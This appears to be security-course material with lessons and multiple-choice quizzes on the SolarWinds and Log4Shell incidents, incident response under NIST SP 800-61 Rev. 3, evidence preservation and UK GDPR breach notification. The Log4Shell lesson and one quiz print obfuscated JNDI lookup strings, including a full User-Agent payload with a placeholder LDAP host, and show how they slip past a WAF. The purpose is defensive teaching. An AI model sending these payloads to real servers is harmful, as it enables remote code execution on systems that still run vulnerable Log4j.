lessons.title: SolarWinds and Log4Shell detection
lessons.summary: See how identity anomalies and runtime behaviour complement literal payload matching.
lessons.body:
Two historical incidents show why a known-file signature or one literal input pattern is incomplete. SolarWinds emerged from investigation of an identity anomaly; Log4Shell payloads changed spelling while the vulnerable lookup behaviour and some runtime effects remained.

## Case study: how SolarWinds was finally caught

SUNBURST was designed to evade detection:

- It waited up to two weeks after installation before doing anything.
- Its traffic imitated the legitimate Orion Improvement Program protocol.
- It checked for security tools and stayed quiet if it found them.
- The follow-on intruders used hostnames matching the victim's naming scheme and IP addresses in the victim's own country.

The campaign spanned months, but installation, follow-on compromise and detection dates differed by organisation; a uniform nine-month dwell time for every customer is not supported. It was the security firm FireEye that eventually noticed, in late 2020, when it found it had been breached itself. In Senate testimony, Kevin Mandia confirmed that an unexpected additional authentication verifier was a tip-off. Details of a particular employee phone call are omitted here because the primary testimony checked does not establish them.

The suspicious identity event helped initiate a much broader investigation; it did not alone establish the whole campaign. FireEye disclosed it on 13 December 2020, and the US CISA issued an emergency directive ordering federal agencies to disconnect Orion.

> [!example] Lesson
> High-value detections are often about **identity and behaviour**, not malware signatures: new MFA devices, impossible travel, a service account logging in interactively, a server talking to a new external domain.

## Case study: detecting Log4Shell

Log4Shell was disclosed on 9 December 2021. Cloudflare saw the first exploitation attempt **nine minutes** later, and found scanning as early as 1 December, eight days before disclosure.

Defenders' first reflex was a rule matching `${jndi:` in request logs. Attackers adapted within hours, using Log4j's own lookup syntax to disguise the string:

```
${${lower:j}ndi:ldap://...}
${${::-j}${::-n}${::-d}${::-i}:...}
${${env:X:-j}ndi:...}
```

These examples illustrate nested/default lookups that can construct `jndi` without containing the literal `${jndi:` pattern in raw input. The environment-default example assumes X is absent; runtime configuration matters. Cloudflare's advice was to treat *any* `${` in input as suspicious. Better still were detections higher up the pyramid:

- **Egress**: unexpected outbound LDAP/RMI connections may be useful warning signs. Restrict unnecessary egress according to the application baseline; some applications legitimately use these protocols, and these blocks do not cover every exploit/exfiltration path.
- **Process behaviour**: a Java process spawning `sh`, `curl` or `powershell`.
- **DNS**: lookups of unusual subdomains from servers (many scanners used DNS callbacks).

And remember the payload can arrive through *any* logged field, not just HTTP: usernames, email subjects, even device names. String-matching on the web tier would never see those.

## Key takeaways
- An unexpected authentication verifier was an investigative clue rather than proof of the whole SolarWinds campaign.
- Nested Log4j lookups can evade a literal raw-input pattern.
- Patching addresses the vulnerable implementation; egress and process detections add path-specific coverage.
- Logged fields outside the web edge also matter.

## Further reading
- [SolarWinds Senate testimony](https://www.govinfo.gov/content/pkg/CHRG-117shrg45485/html/CHRG-117shrg45485.htm)
- [Mandiant SUNBURST analysis](https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor)
- [Cloudflare Log4Shell observations](https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/)
- [Apache Log4j advisories](https://logging.apache.org/log4j/2.x/security.html)

questions.prompt: On 11 December 2021 your WAF blocks any request containing the literal string `${jndi:`. Which request still gets through and can still exploit a vulnerable Log4j?

options.text: `User-Agent: ${jndi:ldap://x.example/a}`
options.explanation: This contains the literal `${jndi:` and would be blocked by the rule.

options.text: `User-Agent: ${${lower:j}ndi:ldap://x.example/a}`
options.explanation: Correct. Log4j evaluates the inner `${lower:j}` to `j`, producing `${jndi:ldap://...}` at log time, but the raw request never contains the literal string the WAF looks for.

options.text: `User-Agent: jndi-ldap-x.example`
options.explanation: Without the `${...}` lookup syntax, Log4j treats this as plain text; nothing is resolved.

options.text: `User-Agent: $jndi:ldap://x.example/a`
options.explanation: Without braces this is not a lookup, so Log4j logs it literally.

questions.workedExample:
1. Log4j processes nested lookups from the inside out.
2. `${lower:j}` -> `j`, so `${${lower:j}ndi:...}` -> `${jndi:...}` -> JNDI lookup fires.
3. The WAF matched raw bytes and saw no `${jndi:`.
4. Cloudflare observed exactly this evolution within days, and advised treating *any* `${` as suspicious.
5. The robust fix was patching; robust detection looked at behaviour (outbound LDAP from servers).

questions.prompt: Your identity platform alerts that a second MFA device was enrolled last night for an engineer's account. The engineer, reached by phone on a number from the staff directory, says they did not add it. What is the most appropriate first response?

options.text: Delete the extra device and close the ticket, since MFA is still required for every login
options.explanation: The new device is probably the attacker's own second factor, so the MFA requirement no longer protects the account. Deleting it without investigating also discards the lead and leaves any sessions or other footholds in place.

options.text: Wait for a second alert from the same account before acting, to avoid a false positive
options.explanation: The owner has already confirmed the enrolment was not theirs, which turns the alert into a probable compromise. Waiting gives the attacker more time.

options.text: Treat it as a probable account compromise: disable the device and the account's sessions, reset the credentials, review that account's sign-in and change logs, and open an incident to scope what else it touched
options.explanation: Correct. An unexpected authentication verifier means someone else may hold the password and a working second factor. Contain the account, preserve and review its logs, and scope further; in 2020 an unexpected extra authentication verifier was the tip-off for FireEye's investigation that uncovered the SolarWinds campaign.

options.text: Search the network for SUNBURST malware signatures, because MFA alerts mean a supply-chain attack
options.explanation: An unexpected MFA device is a sign of account compromise, most often from phishing or stolen credentials. It does not by itself point to any particular campaign; investigate the account first and let the evidence lead.

questions.workedExample:
1. Confirm through a separate channel: the owner, contacted on a directory number rather than any detail from the alert, denies enrolling the device.
2. Draw the conclusion: someone else may have the password *and* a working second factor, so the account is probably compromised.
3. Contain the account: remove the device, end its sessions and tokens, and reset its credentials.
4. Investigate: sign-in logs (sources, times, new locations), recent changes the account made, and what it accessed.
5. Scope: one compromised identity can be a foothold for more, so open an incident.
6. Historical example: in Senate testimony Mandia agreed that an extra authentication verifier was the tip-off that led FireEye to the wider SolarWinds intrusion; the general lesson is that identity anomalies are high-value signals.

questions.prompt: Which Log4Shell mitigations or detection layers address the vulnerable implementation or observe relevant exploit paths independently of the raw obfuscated request spelling? Select all that apply. Not every listed layer covers every possible exploit path.

options.text: Blocking outbound LDAP and RMI connections from application servers at the firewall, and alerting on attempts
options.explanation: Correct as a layer against exploit paths requiring those outbound protocols, regardless of input obfuscation. It is not complete prevention: alternative egress, local gadgets and other behaviors need assessment.

options.text: Detecting Java processes spawning shells or download tools
options.explanation: Correct for attacks that spawn those processes. Behavior detection is independent of the original string but does not cover every post-exploitation path.

options.text: Upgrading Log4j to a fixed version (eventually 2.17.1 for Java 8)
options.explanation: Correct as historical root-cause remediation: install an appropriate maintained release fixed for the applicable advisories and Java line. The Java 8 releases progressed through 2.17.1 in December 2021; that is not a current universal upgrade target. Removing JndiLookup.class was a mitigation for affected paths, with advisory-specific limits.

options.text: A WAF rule matching the exact string `${jndi:ldap://`
options.explanation: Incorrect. `${${lower:j}ndi:...}`, `${${::-j}...}` and the `dns:`/`rmi:` schemes all avoid it.

options.text: Scanning only HTTP request logs at the edge
options.explanation: Incorrect. Any logged field could carry the payload (usernames, email headers, chat messages), including data that never passed the web edge.

questions.workedExample: Literal-string WAF rules can be evaded and web-edge visibility is incomplete. Appropriate patching addresses the vulnerable implementation. Egress restrictions and behavioral detections add coverage for relevant exploit paths, but do not guarantee every possible execution or exfiltration behavior is detected.

lessons.title: Responding, containing and preserving evidence
lessons.summary: Choose incident-specific containment while preserving useful evidence where feasible.
lessons.body:
Detection starts a response, not a fixed script. Responders need roles, a timeline and a view of ongoing harm before choosing containment and incident-recovery steps.

## Incident response

**NIST SP 800-61 Revision 3** (April 2025) is NIST's current incident-response guidance. It replaces the older Revision 2 four-phase cycle (preparation; detection and analysis; containment, eradication and recovery; post-incident activity) with a model built on the six **CSF 2.0** Functions:

```
 Govern · Identify · Protect
 (preparation: broad risk management)
        │
        v
 Detect ─> Respond ─> Recover
 (the incident response itself)
        │
        v
 Improvement (ID.IM): lessons from
 every Function feed back into all
```

The change in emphasis is that incident response is part of everyday risk management, and lessons are learned all the time, not only in a meeting after the incident. The familiar Revision 2 phase names remain a useful vocabulary, and NIST maps them onto the Functions; the sections below use them.

### Preparation (Govern, Identify, Protect)

Done before anything happens: an IR plan, named roles (incident commander, communications, scribe), on-call rotas, contact lists for legal and regulators, logging already set up, and **practice** through tabletop exercises.

### Detection and analysis (Detect)

Confirm it is real, establish scope (which systems, accounts, data) and severity. Start a timeline and a written log of every action taken.

### Containment, eradication and incident recovery (Respond and Recover)

**Containment** stops the incident spreading: isolate hosts, disable accounts, revoke credentials, block domains. There is a real tension:

- Contain prematurely and noisily, and a sophisticated attacker realises they are seen, changes tactics or triggers destructive actions.
- Contain too late, and they keep stealing data.

For a commodity ransomware infection, contain immediately. For a stealthy, persistent intruder, teams sometimes scope quietly first, then evict the attacker everywhere at once.

**Preserve evidence** before you wipe anything. Collect in **order of volatility** (RFC 3227): prioritise the most volatile relevant evidence, such as CPU registers and caches, memory contents, network connections and running processes, before less volatile storage. The order depends on the system, including temporary filesystems and remote logs. Rebooting usually destroys volatile evidence and may leave persistent malware intact. Balance evidence collection with urgent containment and safety; do not delay essential protective action merely to preserve evidence.

> [!analogy] Real-world analogy: footprints in the snow
> Police arriving at a break-in photograph footprints in the snow before they melt, then dust for fingerprints, which will keep. But if the house is on fire, they put the fire out first.
>
> **How it maps:** Melting footprints are volatile evidence such as memory, running processes and network connections; the fingerprints are disk images and stored logs. Photographing first is collecting in order of volatility, and the fire is ongoing harm, such as active encryption or data theft, that justifies containing at once.
>
> **Where it stops:** Photographing snow does not change it, but collecting from a live computer does change its state a little, and an attacker may be watching and change course. Responders weigh that, and the risk of tipping the attacker off, in a way a police photographer does not.

**Eradication** removes the attacker's footholds: malware, backdoor accounts, persistence mechanisms, exploited vulnerabilities, compromised credentials and any others the investigation identifies as exposed (revoke or rotate them). **Incident recovery** restores service, often by rebuilding from known-good images rather than cleaning; check backups for signs of compromise before restoring from them, and monitor closely for the attacker's return.

## Key takeaways
- Prepare plans, roles, contact routes, telemetry and rehearsal before an incident.
- Containment timing depends on harm, evidence and operational safety; coordinated eviction is not a reason for indefinite delay.
- Rebooting can destroy volatile evidence while leaving persistence intact.
- Eradicate footholds, verify restoration sources and restore trusted service while monitoring for return.
- NIST SP 800-61 Rev. 3 frames response with the CSF 2.0 Functions and continuous improvement.

## Further reading
- [NIST SP 800-61 Rev. 3](https://csrc.nist.gov/pubs/sp/800/61/r3/final)
- [Historical NIST SP 800-61 Rev. 2](https://csrc.nist.gov/pubs/sp/800/61/r2/final)
- [RFC 3227 evidence collection](https://www.rfc-editor.org/rfc/rfc3227)

questions.prompt: During an incident, a responder wants to reboot a compromised Linux server immediately to 'kill the malware'. What is the main problem?

options.text: Rebooting is too slow to contain the attack
options.explanation: Speed isn't the concern; a reboot is quick. The concern is what it destroys.

options.text: Rebooting destroys volatile evidence (memory, running processes, network connections), which should be captured first, in order of volatility
options.explanation: Correct: rebooting normally loses memory contents and other volatile evidence, such as live process and network state. Isolate and collect evidence where safe and feasible, balancing urgent harm and operational constraints.

options.text: Rebooting always spreads the malware to other hosts
options.explanation: A reboot doesn't inherently spread malware. The issue is evidence loss and, possibly, persistence surviving the reboot anyway.

options.text: Rebooting is illegal without a court order
options.explanation: Organisations can reboot their own servers. Evidence handling matters for any later legal action, but there is no such legal ban.

questions.workedExample: RFC 3227 prioritises volatile evidence, including CPU registers and caches, memory contents, network connections and running processes, before more persistent stores. Collection itself changes the system, and reboot can lose valuable state without removing persistence. Use an incident-specific preservation/containment plan; immediate safety or damage control can take precedence.

questions.prompt: You discover a stealthy, well-resourced intruder with footholds on at least 12 hosts and several stolen admin credentials. Scoping is incomplete. What containment strategy is generally best?

options.text: Immediately wipe the first host you find, then look for the next one
options.explanation: Piecemeal eviction tips off the attacker, who then uses the remaining footholds (and credentials) to dig in deeper or change tactics.

options.text: Use time-bounded scoping and plan coordinated eviction where feasible, while containing sooner if ongoing harm or safety requires it
options.explanation: Correct. Coordinated action can reduce the chance of leaving obvious footholds, but waiting for certainty about every foothold is unrealistic. Decide containment timing based on harm, evidence, confidence and operational risk.

options.text: Publicly announce the breach first so the attacker knows they've been caught and leaves
options.explanation: Attackers don't politely leave; an announcement before containment invites destructive actions and helps them adapt.

options.text: Rotate the admin passwords now, but leave the hosts running untouched indefinitely
options.explanation: Rotating some credentials alerts the attacker while leaving their host footholds (and perhaps other credentials) untouched.

questions.workedExample:
1. Threat: capable and persistent, with multiple footholds and credentials.
2. If you remove one foothold, the attacker notices and uses another, perhaps deploying new persistence you haven't seen.
3. So scope quietly: hunt via logs, EDR and network data for all footholds.
4. Plan the coordinated eviction: credential rotation (including service accounts and keys), host isolation and rebuild, blocking C2 domains, all in one window.
5. Override this if active harm (exfiltration, ransomware) is ongoing: then contain now.

lessons.title: Learning and breach notification
lessons.summary: Turn incident findings into owned safeguards and prepare timely notification decisions.
lessons.body:
Restoring service does not finish the learning and communication work. A postmortem should explain the conditions that made the incident possible and assign concrete changes. A notification assessment also needs prepared decision-makers: investigation can continue while initial regulatory information is supplied.

### Post-incident activity

Run a **blameless postmortem**: what happened, why, what made it worse, and what will change, with owners and dates. "Blameless" does not mean nobody is accountable; it means you assume people acted reasonably with the information they had, so they tell you the truth. Blaming individuals teaches everyone to hide mistakes.

NIST SP 800-61 Rev. 3 places this learning in the CSF 2.0 Improvement category (ID.IM) and expects it throughout an incident, not only at the end: a gap noticed during containment can be recorded and acted on without waiting for the final review.

Also consider legal duties. For a reportable personal-data breach, the UK GDPR controller must notify the ICO without undue delay and, where feasible, within 72 hours of awareness. The exception is where risk to individuals' rights and freedoms is unlikely; delayed notification needs reasons and information may be supplied in phases. EU GDPR Article 33 uses the same core rule for its competent authority. Other duties, such as processor-to-controller notice or high-risk individual notification, differ; seek jurisdiction-specific advice for an actual incident.

## Apply the lessons

For an accidental object-storage exposure, reconstruct the configuration change and the evidence of access. Ask which guardrails could have prevented the exposure, which review or detection could have caught it sooner, and who owns each improvement. Verify whether proposed public-access settings cover the relevant access paths rather than assuming one setting fixes every case.

Record the awareness time, the notification threshold assessment, available facts and any reason for delay. Incomplete scope is a reason to communicate uncertainty and update information, rather than automatically waiting until every forensic question is answered. Separate duties to a regulator, affected individuals and a customer acting as controller: their triggers and timing can differ. These are preparation principles; an actual incident needs the applicable jurisdiction-specific assessment.

## Key takeaways
- Blameless learning records actions and assigns improvement owners without making punishment the primary goal.
- For a reportable UK GDPR breach, notify without undue delay and, where feasible, within 72 hours of awareness.
- The 72-hour point is not permission to wait unnecessarily, and information can be supplied in phases.
- Prepare separate routes for regulator, controller and individual notifications where applicable.

## Further reading
- [Google SRE postmortem culture](https://sre.google/sre-book/postmortem-culture/)
- [ICO breach guidance](https://ico.org.uk/for-organisations/report-a-breach/personal-data-breach/)
- [AWS S3 Block Public Access](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html)

questions.prompt: A UK company acting as data controller confirms at 09:00 UTC on Monday that a misconfigured export exposed customers' names, addresses and order histories. By Wednesday afternoon the team still does not know how many customers were affected or whether anyone downloaded the data. The breach is judged likely to pose a risk to individuals. What should the company do about the ICO?

options.text: Wait until the forensic investigation is complete, then notify with the full facts, however long that takes
options.explanation: The duty runs from awareness, not from the end of the investigation. UK GDPR expects notification without undue delay and, where feasible, within 72 hours; incomplete facts can be supplied in phases.

options.text: No notification is needed, because no card numbers or passwords were exposed
options.explanation: Names, addresses and order histories are personal data. A breach likely to pose a risk to individuals is reportable whatever the data type; the prompt says the risk threshold is met.

options.text: Notify the ICO by about 09:00 UTC Thursday (72 hours after awareness) with what is known, state what is still being investigated, and send updates as facts emerge
options.explanation: Correct. Report without undue delay and, where feasible, within 72 hours of awareness. If information is incomplete it may be provided in phases; any delay beyond 72 hours needs reasons. Preparing decision-makers and contact routes in advance makes this possible.

options.text: Tell every affected customer first, then notify the ICO only after they have all been contacted
options.explanation: Notifying the regulator is not conditional on first notifying individuals, and the company does not yet know who all the affected customers are. Individual notification has its own, higher-risk trigger.

questions.workedExample:
1. Start the clock at awareness: Monday 09:00 UTC, when the company confirmed the exposure.
2. The ICO expectation: notify without undue delay and, where feasible, within 72 hours, so by about Thursday 09:00 UTC. The 72 hours is a limit, not a waiting period.
3. Incomplete scope does not justify silence: report what is known, say what is still under investigation, and follow up in phases.
4. Record the awareness time, the risk assessment and any reasons for delay.
5. Consider separately whether individuals must be told (a high-risk test) and any contractual duties to customers. A real incident needs jurisdiction-specific advice.

questions.prompt: After an accidental bucket exposure, why does a blameless postmortem focus on system conditions and safeguards rather than making punishment its primary purpose?

options.text: Because nobody is ever accountable for anything in a blameless culture
options.explanation: Blameless does not mean unaccountable. Teams remain accountable for implementing the fixes; it's individual *blame* for honest mistakes that is avoided.

options.text: Because legally the cloud provider is always responsible for misconfigurations
options.explanation: Under the shared responsibility model, bucket configuration is the customer's responsibility. Liability isn't the reason.

options.text: Because postmortems should never mention what anyone did
options.explanation: Postmortems describe actions in detail (who did what, when); they just frame them as reasonable decisions given the information and tools available.

options.text: Because punishing honest mistakes teaches people to hide them, while the real cause is a system that let one person make public a sensitive bucket without guardrails
options.explanation: Correct. Ask why the access path was permitted, what review and detection were missing, and which safeguards cover the actual configuration. Assign owners and deadlines; no one setting universally fixes every exposure.

questions.workedExample: Describe what happened and the conditions that made the error possible. Identify safeguards such as public-access controls, review and detection, with owners and deadlines. A learning-focused review encourages candid reporting; it does not preclude separate accountability processes or establish a universal employment/legal rule.
